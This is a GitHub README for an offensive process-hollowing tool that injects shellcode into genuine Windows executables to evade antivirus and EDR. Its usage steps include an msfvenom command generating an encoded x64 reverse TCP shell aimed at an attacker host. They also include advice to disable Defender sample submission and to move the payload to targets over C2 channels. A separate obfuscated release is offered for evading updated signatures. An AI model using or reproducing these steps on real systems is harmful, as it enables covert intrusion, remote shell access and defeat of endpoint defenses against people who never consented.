# Process-Hollowing
### Red Team Operation's Defense Evasion Technique for executing payload without raising flags on Target System.

## Kindly read [How To Use](https://github.com/vatsalgupta67/Process-Hollowing/blob/main/README.md#%EF%B8%8Fhow-to-use) !! - ***This is a Defense Evasion Technique so with time we add some suggestions for Red Team Ops to fulfill their primary objectives, so you can work Smoothly !!***

> [!WARNING]
> ## **This Binary made for Red Team Operations and user is only be responsible for the use, There's no liability of the Owner.**

# ***Made With ❤️ in 🇮🇳!!!***

### Credit of these Images goes to  their respective creators :relaxed:!!

![hollowing1-1_](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/dd3cbd07-ebf0-447e-82f7-9b71384f9b00) 

![491809_1_En_10_Fig27_HTML](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/f972fda2-6e65-4bb8-86e5-5f984619f8fe)


![90540-1sncmwnz19drbfqzllk_d5w](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/cdcee61d-1672-4bf6-9acc-2b952747e1cf)



We have both x86 and x64 bit release as you want. **we strongly suggest x64-bit release if you're confused about compiling manually.**

We suggest to use directly compiled executables as in some situations it depends on your compiler functionality. Both executables are stable and tested several times.


**If you wish to Compile x64 bit relese on Kali with cross-compiler - x86_64-w64-mingw32-gcc.** 

**For 32-bit - Mingw for Windows.**

# Index

* [Demo](https://github.com/vatsalgupta67/Process-Hollowing/blob/main/README.md#demo)

* [How to use](https://github.com/vatsalgupta67/Process-Hollowing/blob/main/README.md#how-to-use)

## Tools Resources and skills used 

1. ChatGPT for researching about required Windows API and functionality.

2. Visual Studio Code - Linux and Windows.

3. Cross-compiler.
4. Process-Hollowing Technique working.

5. Deep-imagination .
6. Error-handling.
7. Programming Skills.
8. Time.
9. Defeating Failures.
10. Tons of Research.
11. Dedication.
12. Smart Work.

## Demo

![windows-hollow](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/cbc55b11-94c1-4416-a200-43f76abc9baf)

![kali](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/4a258dcc-0f40-4ec7-9422-1422a97686c9)

![win-update](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/a9421032-566d-49f0-a0a0-9857395a5624)


![firewall](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/96c3d3cd-6708-4640-83f0-e44c4a642907)


![windef-2](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/ca002758-e1e4-43b3-be87-7a59242f80f5)

![windows-def](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/dc8b587a-10f4-4408-8203-539640b50cde)

# ⚠️How to use

> [!NOTE]
> ## Sometimes you have to Re-run the program because of Memory Issues. But do not worry, You'll get the shell on Re-run !!!  :nazar_amulet:


### Recommended to Turn-Off "Automatic Sample Submission" If you can or using in the testing environment.

***1. Generate a .bin file only - You can use C2 servers and metasploit too or any you want***

### Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=< IP > LPORT=< PORT > -f raw -i < iterations as you want for evasion > -e < encoder you want to use > -o shell.bin - **x64-Bit**
  
 **2. Obfuscation is mainly depends your work to do as per your operation's requirement and the other things? - WE'LL HANDLE!!!**
  
***3. Transfer Both Payload and Binary to Target System.***  

***4. Hollow64.exe < Path to Any application to run or show as example -notepad.exe, calc.exe > < Path to Shellcode file > .*** - You can refer to above demonstration images and binary itself to understand also .  
  
*5. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.*
  
**6. After Execution, Payload will be run as your specified genuine windows executable ( system32's too ).**
  
***7. If you're injecting to custom binary - It might fails due to Memory allocation issue , still depends on your Privilege and many 3rd
level factors. But you can give it a try - In some cases it will work !! :nazar_amulet:***

***8. As we know EDR's and AV signatures keep updating, so we created an obfuscated release to assist you and have tested on the Latest Updated Windows . !!!***

 > [!IMPORTANT]
 > ## ⚠️**Keep few things in mind when using obfuscated release -**  

  * Never Directly Download Executable via Github on the target system, I found some bytes were missing - Technical Issue  + WindowsSmartScreen even mark genuine executables malicious too while downloading .EXE from Github. ( That's why Non-Malicious like WinPEAs , which is for PrivEsc too faces some windowsSmartScreen blockings ) 

 * Best way is to Download from Github to your Kali Linux or any Attacker Machine first and then transfer it to Target System via C2 Channels or any you like. ( Invoke-WebRequest too )

 * In this case you'll not face any problems regarding missing bytes or EDR. 

 * Sometimes you have to apply many other ways to Bypass EDR and there's not always be a Signature-Patch issue. But there might be a Feature or some Technical problems like missing bytes of the binary, which restricting us.



